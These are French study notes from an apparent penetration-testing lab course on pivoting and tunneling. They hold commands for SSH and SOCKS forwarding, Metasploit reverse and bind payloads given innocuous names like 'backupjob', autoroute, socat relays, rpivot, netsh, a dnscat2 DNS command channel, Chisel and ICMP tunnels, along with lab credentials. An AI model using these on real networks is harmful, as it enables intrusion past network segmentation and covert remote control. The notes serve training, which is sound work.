# Introduction au Pivoting, au Tunneling et à la Redirection de Port

Il existe de nombreux termes différents pour décrire un hôte compromis que nous pouvons utiliser pour pivoter (pivot) vers un segment de réseau auparavant inaccessible. Certains des plus courants sont :

- Hôte Pivot (Pivot Host)
- Proxy
- Point d'ancrage (Foothold)
- Système tête de pont (Beach Head system)
- Hôte de rebond (Jump Host)

L'utilisation principale du pivoting est de contourner la segmentation (à la fois physique et virtuelle) pour accéder à un réseau isolé. Le tunneling, quant à lui, est un sous-ensemble du pivoting. Le tunneling encapsule le trafic réseau dans un autre protocole et l'achemine à travers celui-ci. 

# Redirection de port dynamique avec tunnelisation SSH et SOCKS
La redirection de port (port forwarding) est une technique qui nous permet de rediriger une requête de communication d'un port à un autre. La redirection de port utilise TCP comme couche de communication principale pour fournir une communication interactive pour le port redirigé. 

### Exécution de la redirection de port locale

```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

tunnelisation SSH
etape 1 : Activation de la redirection de port dynamique avec SSH

```
ssh -D 9050 ubuntu@10.129.202.64
```

L'argument -D demande au serveur SSH d'activer la redirection de port dynamique. Une fois que nous avons activé cela, nous aurons besoin d'un outil capable de router les paquets de n'importe quel outil via le port 9050. Nous pouvons le faire en utilisant l'outil proxychains, qui est capable de rediriger les connexions TCP via des serveurs proxy TOR, SOCKS et HTTP/HTTPS, et nous permet également de chaîner plusieurs serveurs proxy ensemble. 

Pour informer proxychains que nous devons utiliser le port 9050, nous devons modifier le fichier de configuration de proxychains situé à /etc/proxychains.conf. Nous pouvons ajouter socks4 127.0.0.1 9050 à la dernière ligne si ce n'est pas déjà le cas.
 etape 2 : 
 Pour informer proxychains que nous devons utiliser le port 9050, nous devons modifier le fichier de configuration de proxychains situé à /etc/proxychains.conf. Nous pouvons ajouter socks4 127.0.0.1 9050 à la dernière ligne si ce n'est pas déjà le cas.

```
tail -4 /etc/proxychains4.conf
```


etape 3 : Utilisation de proxychains 

### Redirection de Port Distante/Inversée avec SSH

# Tunneling et redirection de port avec Meterpreter

## Création de la charge utile pour l'hôte pivot Ubuntu

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Avant de copier la charge utile (payload), nous pouvons démarrer un multi/handler, également connu sous le nom de Gestionnaire de charge utile générique (Generic Payload Handler).

### Configuration & Démarrage du multi/handler

```
msf6 > use exploit/multi/handler
```

### Balayage Ping

```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Balayage Ping avec une boucle For sur les hôtes pivots Linux

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

Balayage Ping avec une boucle For en utilisant CMD

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Balayage Ping en utilisant PowerShell

```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

Il peut y avoir des scénarios où le pare-feu d'un hôte bloque le ping (ICMP), et le ping ne nous donnera pas de réponses positives. Dans ces cas, nous pouvons effectuer un scan TCP sur le réseau 172.16.5.0/23 avec Nmap. Au lieu d'utiliser SSH pour la redirection de port (port forwarding), nous pouvons aussi utiliser le module de routage post-exploitation de Metasploit socks_proxy pour configurer un proxy local sur notre hôte d'attaquant. 

Configuration du proxy SOCKS de MSF

```
msf6 > use auxiliary/server/socks_proxy
```

Confirmation du fonctionnement du serveur proxy

```
msf6 auxiliary(server/socks_proxy) > jobs
```

Ajout d'une ligne à proxychains.conf si nécessaire

```
socks4  127.0.0.1 9050
```

Remarque : Selon la version du serveur SOCKS en cours d'exécution, nous devrons peut-être occasionnellement changer socks4 en socks5 dans proxychains.conf.

Nous pouvons utiliser le module post/multi/manage/autoroute de Metasploit pour ajouter des routes pour le sous-réseau 172.16.5.0, puis router tout notre trafic proxychains.


Création de routes avec AutoRoute

```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

Il est également possible d'ajouter des routes avec autoroute en exécutant autoroute depuis la session Meterpreter.

```
meterpreter > run autoroute -s 172.16.5.0/23
```

Après avoir ajouté la ou les routes nécessaires, nous pouvons utiliser l'option -p pour lister les routes actives afin de nous assurer que notre configuration est appliquée comme prévu.

Test de la fonctionnalité du proxy et du routage

```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

###  Redirection de port

La redirection de port peut également être réalisée en utilisant le module portfwd de Meterpreter.

Création d'un relais TCP local

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```


La commande ci-dessus demande à la session Meterpreter de démarrer un écouteur sur le port local (-l) 3300 de notre hôte d'attaquant et de rediriger tous les paquets vers le serveur Windows distant (-r) 172.16.5.19 sur le port (-p) 3389 via notre session Meterpreter. Maintenant, si nous exécutons xfreerdp sur notre localhost:3300, nous pourrons créer une session de bureau à distance.

```
xfreerdp /v:localhost:3300 /u:victor /p:pass
```

Sortie de Netstat

### Redirection de port inversée avec Meterpreter

Similaire aux redirections de port locales, Metasploit peut également effectuer une redirection de port inversée (reverse port forwarding) avec la commande ci-dessous, où vous pourriez vouloir écouter sur un port spécifique du serveur compromis et rediriger tous les shells entrants du serveur Ubuntu vers notre hôte d'attaquant. 

Règles de redirection de port inversée

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Configuration & Démarrage du multi/handler

```
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run
```

Nous pouvons maintenant créer une charge utile de reverse shell qui renverra une connexion à notre serveur Ubuntu sur 172.16.5.129:1234 lorsqu'elle sera exécutée sur notre hôte Windows. Une fois que notre serveur Ubuntu reçoit cette connexion, il la redirigera vers l'ip de l'hôte de l'attaquant:8081 que nous avons configuré.

Génération de la charge utile Windows

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
## Redirection avec Socat et un reverse shell

Socat est un outil de relais bidirectionnel qui peut créer des sockets de type pipe entre 2 canaux réseau indépendants sans avoir besoin d'utiliser le tunneling SSH. 

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat écoutera sur localhost sur le port 8080 et redirigera tout le trafic vers le port 80 de notre hôte attaquant (10.10.14.18). Une fois notre redirecteur configuré, nous pouvons créer une charge utile (payload) qui se reconnectera à notre redirecteur, qui s'exécute sur notre serveur Ubuntu. 


### Redirection Socat avec un Shell Bind



![[Pasted image 20260724143359.png]]

Création de la Charge Utile Windows

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Démarrage de l'Écouteur de Shell Bind Socat

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Configuration & Démarrage du multi/handler de Bind

msf6 > use exploit/multi/handler

```
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run
```


## SSH pour Windows : plink.exe

Plink, abréviation de PuTTY Link, est un outil SSH en ligne de commande pour Windows qui fait partie du paquet PuTTY lors de son installation. Similaire à SSH, Plink peut également être utilisé pour créer des redirections de port dynamiques (dynamic port forwards) et des proxys SOCKS. Avant l'automne 2018, Windows n'incluait pas de client SSH natif, les utilisateurs devaient donc installer le leur. L'outil de prédilection de nombreux administrateurs système qui avaient besoin de se connecter à d'autres hôtes était PuTTY.


Utilisation de Plink.exe

```
plink -ssh -D 9050 ubuntu@10.129.15.50
```
### Pivotage SSH avec Sshuttle

Sshuttle est un autre outil écrit en Python qui élimine le besoin de configurer proxychains. Cependant, cet outil ne fonctionne que pour le pivotage (pivoting) via SSH et ne fournit pas d'autres options pour le pivotage via des serveurs proxy TOR ou HTTPS.

Exécution de sshuttle

```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

### Pivot de Serveur Web avec Rpivot

Rpivot est un outil de proxy SOCKS inversé écrit en Python2 pour la création de tunnels SOCKS (SOCKS tunneling). Rpivot lie une machine à l'intérieur d'un réseau d'entreprise à un serveur externe et expose le port local du client côté serveur. Nous allons prendre le scénario ci-dessous, dans lequel nous avons un serveur web sur notre réseau interne (172.16.5.135), et nous voulons y accéder en utilisant le proxy rpivot.

Clonage de rpivot

```
larassvladimir@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```

Exécution de server.py depuis l'Hôte de l'Attaquant

```
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Avant d'exécuter client.py, nous devrons transférer rpivot sur la cible. Nous pouvons le faire en utilisant cette commande SCP :

Transfert de rpivot vers la Cible

```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Exécution de client.py depuis la Cible de Pivot

```
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

Nous allons configurer proxychains pour pivoter via notre serveur local sur 127.0.0.1:9050 sur notre machine d'attaque, qui a été initialement démarré par le serveur Python.

Naviguer vers le serveur web cible en utilisant Proxychains

```
proxychains firefox-esr 172.16.5.135:80
```

Connexion à un serveur web via un proxy HTTP et une authentification NTLM


```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```


### Redirection de port avec Windows Netsh

Netsh est un outil en ligne de commande Windows qui peut aider à la configuration réseau d'un système Windows particulier. Voici quelques-unes des tâches liées au réseau pour lesquelles nous pouvons utiliser Netsh :

- Trouver des routes
- Afficher la configuration du pare-feu
- Ajouter des proxys
- Créer des règles de redirection de port (port forwarding)

Utilisation de Netsh.exe pour la redirection de port

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Vérification de la redirection de port

```
netsh.exe interface portproxy show v4tov4
```

## Tunnelisation DNS (tunneling DNS) avec Dnscat2

Dnscat2 est un outil de tunnelisation qui utilise le protocole DNS pour envoyer des données entre deux hôtes. Il utilise un canal de commande et de contrôle (Command-&-Control, C&C ou C2) chiffré et envoie des données à l'intérieur d'enregistrements TXT au sein du protocole DNS.

### Installation et Utilisation de dnscat2

```
git clone https://github.com/iagox86/dnscat2.git
```

Démarrage du serveur dnscat2

```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 
```


Clonage de dnscat2-powershell sur l'hôte attaquant

```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```


Importation de dnscat2.ps1

```
Import-Module .\dnscat2.ps1
```

```
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

Nous devons utiliser le secret pré-partagé ( -PreSharedSecret) généré sur le serveur pour nous assurer que notre session est établie et chiffrée. 


### Tunnelisation SOCKS5 avec Chisel
Chisel est un outil de tunnelisation (tunneling) basé sur TCP/UDP, écrit en Go, qui utilise HTTP pour transporter des données sécurisées par SSH. Chisel peut créer une connexion tunnel client-serveur dans un environnement restreint par un pare-feu (firewall). 

Mise en place & Utilisation de Chisel
Clonage de Chisel

```
git clone https://github.com/jpillora/chisel.git
```

Nous aurons besoin du langage de programmation Go installé sur notre système pour compiler le binaire Chisel. 

Compilation du binaire Chisel

```
go build 
```

https://0xdf.gitlab.io/cheatsheets/chisel

Lancement du serveur Chisel sur l'hôte pivot

```
 ./chisel server -v -p 1234 --socks5
```

L'écouteur Chisel écoutera les connexions entrantes sur le port 1234 en utilisant SOCKS5 (--socks5) et les redirigera vers tous les réseaux accessibles depuis l'hôte pivot. Dans notre cas, l'hôte pivot a une interface sur le réseau 172.16.5.0/23, ce qui nous permettra d'atteindre des hôtes sur ce réseau.

Connexion au serveur Chisel

```
./chisel client -v 10.129.202.64:1234 socks
```

Comme vous pouvez le voir dans la sortie ci-dessus, le client Chisel a créé un tunnel TCP/UDP via HTTP sécurisé par SSH entre le serveur Chisel et le client, et a commencé à écouter sur le port 1080.

### Pivot inversé avec Chisel

Démarrage du serveur Chisel sur notre hôte d'attaque

```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Connexion du client Chisel à notre hôte d'attaque

```
./chisel client -v 10.10.14.17:1234 R:socks
```


### Tunneling ICMP avec SOCKS

Le tunneling ICMP (ICMP tunneling) encapsule votre trafic dans des paquets ICMP contenant des requêtes et des réponses echo. Le tunneling ICMP ne fonctionnera que si les réponses au ping sont autorisées au sein d'un réseau protégé par un pare-feu.

Nous utiliserons l'outil ptunnel-ng pour créer un tunnel entre notre serveur Ubuntu et notre machine d'attaque. Une fois le tunnel créé, nous pourrons proxifier notre trafic à travers le client ptunnel-ng. Nous pouvons démarrer le serveur ptunnel-ng sur l'hôte pivot cible. Commençons par configurer ptunnel-ng.


Configuration et utilisation de ptunnel-ng

Cloner Ptunnel-ng

```
git clone https://github.com/utoni/ptunnel-ng.git
```

Compiler Ptunnel-ng avec Autogen.sh

```
sudo ./autogen.sh
```

Après avoir exécuté autogen.sh, ptunnel-ng peut être utilisé côté client et côté serveur. Nous devrons maintenant transférer le dépôt de notre machine d'attaque vers l'hôte cible.

Approche alternative pour compiler un binaire statique

```
sudo apt install automake autoconf -y
 cd ptunnel-ng/
 sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
 ./autogen.sh
```

Transférer Ptunnel-ng vers l'hôte pivot

```
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Démarrer le serveur ptunnel-ng sur l'hôte cible

```
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

L'adresse IP qui suit -r doit être l'IP de la machine de rebond (jump-box) sur laquelle nous voulons que ptunnel-ng accepte les connexions. 

Connexion au serveur ptunnel-ng depuis la machine d'attaque

```
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

Une fois le tunnel ICMP de ptunnel-ng établi avec succès, nous pouvons tenter de nous connecter à la cible en utilisant SSH via le port local 2222 (-p2222).

Tunneler une connexion SSH à travers un tunnel ICMP

```
ssh -p2222 -lubuntu 127.0.0.1
```

Activer la redirection de port dynamique via SSH

```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Utiliser Proxychains à travers le tunnel ICMP

```
proxychains nmap -sV -sT 172.16.5.19 -p3389
```


### Tunneling RDP et SOCKS avec SocksOverRDP

Lors d'une évaluation, il arrive souvent que nous soyons limités à un réseau Windows et que nous ne puissions pas utiliser SSH pour le pivotage (pivoting). Dans ces cas, nous devons utiliser les outils disponibles pour les systèmes d'exploitation Windows. SocksOverRDP est un exemple d'outil qui utilise les Canaux Virtuels Dynamiques (DVC - Dynamic Virtual Channels) de la fonctionnalité Service Bureau à distance de Windows. 

Pour réaliser cette attaque, nous pouvons commencer par télécharger les binaires appropriés sur notre machine attaquante. 
- Binaires x64 de SocksOverRDP
- Binaire portable de Proxifier
Nous pouvons ensuite nous connecter à la cible en utilisant xfreerdp et copier le fichier SocksOverRDPx64.zip sur la cible. Depuis la cible Windows

Chargement de SocksOverRDP.dll avec regsvr32.exe

```
regsvr32.exe SocksOverRDP-Plugin.dll
```

Nous pouvons maintenant nous connecter à 172.16.5.19 via RDP en utilisant mstsc.exe, et nous devrions recevoir une invite indiquant que le plugin SocksOverRDP est activé et qu'il écoutera sur 127.0.0.1:1080. Nous pouvons utiliser les identifiants victor:pass@123 pour nous connecter à 172.16.5.19.

Nous devrons transférer SocksOverRDPx64.zip ou simplement le fichier SocksOverRDP-Server.exe vers 172.16.5.19. Nous pouvons ensuite démarrer SocksOverRDP-Server.exe avec les privilèges Administrateur.

Confirmation du démarrage de l'écouteur SOCKS

```
netstat -antb | findstr 1080
```

Après avoir démarré notre écouteur, nous pouvons transférer la version portable de Proxifier sur la cible Windows 10 (sur le réseau 10.129.x.x), et le configurer pour transférer tous nos paquets vers 127.0.0.1:1080. Proxifier acheminera le trafic via l'hôte et le port spécifiés. 

Une fois Proxifier configuré et en cours d'exécution, nous pouvons démarrer mstsc.exe. Il utilisera Proxifier pour pivoter tout notre trafic via 127.0.0.1:1080, qui le tunnélisera via RDP vers 172.16.5.19, qui l'acheminera ensuite vers 172.16.6.155 en utilisant SocksOverRDP-server.exe.

Considérations sur les performances RDP

Lors de l'interaction avec nos sessions RDP pendant une mission, nous pouvons être confrontés à des performances lentes dans une session donnée, surtout si nous gérons plusieurs sessions RDP simultanément

